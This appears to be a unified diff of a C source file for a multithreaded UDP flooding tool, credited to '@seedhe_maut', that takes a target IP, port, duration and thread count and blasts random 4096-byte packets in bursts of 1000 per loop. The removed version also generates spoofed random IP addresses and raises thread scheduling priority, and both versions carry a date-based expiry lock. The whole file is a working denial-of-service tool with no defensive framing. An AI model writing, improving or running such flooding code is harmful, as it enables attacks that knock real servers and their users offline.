@@ -1,127 +1,100 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
+#include <unistd.h>
 #include <arpa/inet.h>
 #include <pthread.h>
-#include <unistd.h>
 #include <time.h>
-#include <sched.h>
+#include <fcntl.h>
 
-#define EXPIRY_YEAR 2025
-#define EXPIRY_MONTH 3
-#define EXPIRY_DAY 20
-#define PACKET_SIZE 4096  // Increased packet size for more impact
-#define BURST_COUNT 10    // Number of packets sent per burst
+#define PACKET_SIZE 4096   // Adjustable UDP payload size
+#define MAX_THREADS 2048   // Higher thread limit for more power
+#define EXPIRY_DATE 1742448000  // UNIX timestamp for March 20, 2025
 
-// Attack parameters
-char target_ip[20];
-int target_port, attack_time, num_threads;
+// MADE AND OWNER BY @seedhe_maut
 
-// Expiry function
+typedef struct {
+    char target_ip[16];
+    int target_port;
+    int duration;
+} AttackParams;
+
+// Expiry function: Prevents execution after March 20, 2025
 void check_expiry() {
-    time_t now = time(NULL);
-    struct tm expiry_date = {.tm_year = EXPIRY_YEAR - 1900, .tm_mon = EXPIRY_MONTH - 1, .tm_mday = EXPIRY_DAY};
-
-    if (difftime(now, mktime(&expiry_date)) > 0) {
-        printf("[-] This script has expired. Contact @seedhe_maut for updates.\n");
-        exit(EXIT_FAILURE);
+    time_t current_time = time(NULL);
+    if (current_time > EXPIRY_DATE) {
+        printf("❌ This script has expired. Contact @seedhe_maut for an update.\n");
+        exit(1);
     }
 }
 
-// Error handling
-void handle_error(const char *message) {
-    perror(message);
-    exit(EXIT_FAILURE);
+// Function to generate a strong random payload
+void generate_payload(char *buffer, size_t size) {
+    for (size_t i = 0; i < size; i++) {
+        buffer[i] = (char)(rand() % 256);
+    }
 }
 
-// Generates a random IP for IP spoofing
-char *random_ip() {
-    static char spoofed_ip[16];
-    snprintf(spoofed_ip, sizeof(spoofed_ip), "%d.%d.%d.%d", 
-             rand() % 255, rand() % 255, rand() % 255, rand() % 255);
-    return spoofed_ip;
-}
-
-// UDP flood function
+// Attack function executed by each thread
 void *udp_flood(void *arg) {
-    struct sockaddr_in victim;
+    AttackParams *params = (AttackParams *)arg;
+    struct sockaddr_in target;
     int sock;
-    char packet[PACKET_SIZE];
+    char buffer[PACKET_SIZE];
 
-    // Set target details
-    memset(&victim, 0, sizeof(victim));
-    victim.sin_family = AF_INET;
-    victim.sin_port = htons(target_port);
-    victim.sin_addr.s_addr = inet_addr(target_ip);
+    target.sin_family = AF_INET;
+    target.sin_port = htons(params->target_port);
+    inet_pton(AF_INET, params->target_ip, &target.sin_addr);
 
-    // Create high-priority thread
-    struct sched_param param;
-    param.sched_priority = sched_get_priority_max(SCHED_RR);
-    pthread_setschedparam(pthread_self(), SCHED_RR, &param);
-
-    // Create RAW UDP socket
+    // Create socket with non-blocking mode for continuous sending
     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    if (sock < 0) handle_error("Socket creation failed");
-
-    int optval = 1;
-    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
-
-    printf("[+] Thread %ld attacking %s:%d\n", pthread_self(), target_ip, target_port);
-
-    memset(packet, 'X', sizeof(packet));  // Increased payload density
+    if (sock < 0) {
+        perror("Socket creation failed");
+        return NULL;
+    }
+    fcntl(sock, F_SETFL, O_NONBLOCK);  // Set non-blocking mode
 
     time_t start_time = time(NULL);
-    while (time(NULL) - start_time < attack_time) {
-        for (int i = 0; i < BURST_COUNT; i++) {
-            if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&victim, sizeof(victim)) < 0) {
-                perror("Send failed");
-            }
+    generate_payload(buffer, sizeof(buffer));
+
+    while (time(NULL) - start_time < params->duration) {
+        for (int i = 0; i < 1000; i++) {  // Burst fire for maximum impact
+            sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target));
         }
     }
 
     close(sock);
-    pthread_exit(NULL);
+    return NULL;
 }
 
-// Starts attack threads
-void start_attack() {
-    pthread_t threads[num_threads];
-
-    for (int i = 0; i < num_threads; i++) {
-        if (pthread_create(&threads[i], NULL, udp_flood, NULL) != 0) {
-            handle_error("Thread creation failed");
-        }
-    }
-
-    for (int i = 0; i < num_threads; i++) {
-        pthread_join(threads[i], NULL);
-    }
-}
-
-// Main function
 int main(int argc, char *argv[]) {
-    printf("🔥 MAX-POWER UDP FLOODER 🔥\nMade and Owned by @seedhe_maut\n");
-
-    check_expiry(); // Check expiry before execution
+    check_expiry();  // Ensure script hasn't expired
 
     if (argc != 5) {
-        printf("Usage: %s <IP> <Port> <Time (seconds)> <Threads>\n", argv[0]);
-        return EXIT_FAILURE;
+        printf("Usage: %s <IP> <Port> <Time> <Threads>\n", argv[0]);
+        return 1;
     }
 
-    // Get parameters from command line
-    strncpy(target_ip, argv[1], sizeof(target_ip) - 1);
-    target_port = atoi(argv[2]);
-    attack_time = atoi(argv[3]);
-    num_threads = atoi(argv[4]);
+    char *ip = argv[1];
+    int port = atoi(argv[2]);
+    int duration = atoi(argv[3]);
+    int thread_count = atoi(argv[4]);
 
-    printf("[*] Starting MAX-POWER UDP flood attack on %s:%d for %d seconds using %d threads...\n",
-           target_ip, target_port, attack_time, num_threads);
+    if (thread_count > MAX_THREADS) {
+        thread_count = MAX_THREADS;  // Prevent excessive threads
+    }
 
-    start_attack();
+    pthread_t threads[MAX_THREADS];
+    AttackParams params = {.target_port = port, .duration = duration};
+    strncpy(params.target_ip, ip, sizeof(params.target_ip) - 1);
 
-    printf("[*] Attack completed.\n");
-    return EXIT_SUCCESS;
+    for (int i = 0; i < thread_count; i++) {
+        pthread_create(&threads[i], NULL, udp_flood, &params);
+    }
+
+    for (int i = 0; i < thread_count; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    return 0;
 }
